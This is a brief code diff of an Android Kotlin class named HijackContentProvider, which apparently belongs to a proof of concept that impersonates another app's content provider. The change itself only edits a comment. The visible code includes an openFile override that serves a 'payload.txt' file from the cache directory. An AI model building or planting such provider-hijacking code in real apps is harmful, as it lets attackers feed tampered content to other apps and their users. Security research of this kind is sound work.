@@ -21,9 +21,7 @@ class HijackContentProvider : ContentProvider() {
         return cursor
     }
 
-    // --- The rest of the provider can be copied from ArtworksContentProvider ---
-    // --- or simplified if it only needs to provide the name. ---
-
+    // --- The rest just copied from ArtworksContentProvider ---
     override fun onCreate(): Boolean = true
     override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
         val file = File(context!!.cacheDir, "payload.txt")
